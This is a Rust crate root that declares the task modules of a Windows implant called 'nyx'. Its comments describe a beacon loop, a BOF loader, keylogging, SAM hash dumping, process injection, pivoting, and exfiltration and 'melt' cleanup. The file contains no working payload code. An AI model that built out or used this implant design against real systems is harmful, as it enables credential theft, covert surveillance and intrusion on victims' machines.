//! nyx-implant-tasks — task layer of the Windows PIC implant.
//!
//! Extracted from `nyx-implant-win` (WP-C crate split, step 4): the fourth
//! layer of the implant DAG (`core ← evasion ← net ← tasks ← shell`).
//! Everything here builds on [`nyx_implant_core`] (heap/resolve/syscalls/
//! hostinfo/config/diag), [`nyx_implant_evasion`] (blind/mem/sleep/cfg_user)
//! and [`nyx_implant_net`] (channels/transport), and is consumed upward by
//! the shell crate (`entry.rs` drives `beacon`/`screenshot`/`selftests`);
//! nothing here may depend on the shell.
//!
//! This crate is `#![no_std]` like the shell and the layers below; the
//! globally-unique items (`#[global_allocator]`, `#[panic_handler]`, …) stay
//! in the shell cdylib (`nyx-implant-win`).
//!
//! ## Modules
//! - [`beacon`] — the task loop (check-in → POST → receive → execute); every
//!   wire `Command`.
//! - [`bof`] — W^X COFF loader + Beacon-API shims (`#[no_mangle]` `Beacon*`
//!   exports the loader keys on by name).
//! - [`bof_isolated`] — B3 sacrificial child-process BOF execution (bof-host
//!   blob, section delivery, pipe capture); re-exported as
//!   `crate::bof::bof_isolated`.
//! - [`config_placeholder`] — the `#[no_mangle]` `NYX_CFG_PLACEHOLDER` static
//!   the server patches by symbol name during `generate_implant`.
//! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
//! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
//! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
//! - [`inject`] / [`tp`] / [`fls`] / [`kits`] — process injection (incl.
//!   thread-pool party and FLS callback) + CS-style kit seams.
//! - [`env_keying`] — environment-keyed config encryption layers.
//! - [`task_guard`] — crash-guarded task execution (setjmp-style snapshot).
//! - [`trex`] — target-environment assessment + cleanup/delivery/melt/exfil.
//! - [`selftests`] — per-module `rundll32` self-test exports (feature-gated).

#![cfg_attr(not(test), no_std)]

extern crate alloc;

#[cfg(target_os = "windows")]
pub mod beacon;
#[cfg(target_os = "windows")]
pub mod bof;
#[cfg(target_os = "windows")]
pub mod bof_isolated;
#[cfg(target_os = "windows")]
pub mod config_placeholder;
#[cfg(target_os = "windows")]
pub mod env_keying;
// fls additionally carries a file-level `#![cfg(target_os = "windows")]`;
// the outer gate here mirrors the tp.rs declaration pattern.
#[cfg(target_os = "windows")]
pub mod fls;
#[cfg(target_os = "windows")]
pub mod fs;
#[cfg(target_os = "windows")]
pub mod hashdump;
// inject was declared WITHOUT a cfg gate in the shell crate before the split
// (its internals carry their own gates); keep that exact form.
pub mod inject;
#[cfg(target_os = "windows")]
pub mod keylog;
// kits additionally carries a file-level `#![cfg(target_os = "windows")]`;
// the outer gate here mirrors its declaration in the shell crate.
#[cfg(target_os = "windows")]
pub mod kits;
#[cfg(target_os = "windows")]
pub mod pivot;
#[cfg(target_os = "windows")]
pub mod postex;
#[cfg(target_os = "windows")]
pub mod recon;
#[cfg(target_os = "windows")]
pub mod screenshot;
#[cfg(target_os = "windows")]
pub mod selftests;
#[cfg(target_os = "windows")]
pub mod shell;
#[cfg(target_os = "windows")]
pub mod task_guard;
#[cfg(target_os = "windows")]
pub mod tp;
#[cfg(target_os = "windows")]
pub mod trex;
